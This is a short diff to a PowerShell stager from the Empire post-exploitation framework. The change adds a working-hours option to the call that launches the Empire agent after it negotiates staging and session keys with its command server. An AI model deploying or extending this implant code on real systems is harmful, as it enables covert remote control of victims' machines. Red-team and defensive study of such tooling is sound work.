@@ -204,7 +204,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID;
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE";
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -T $T -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
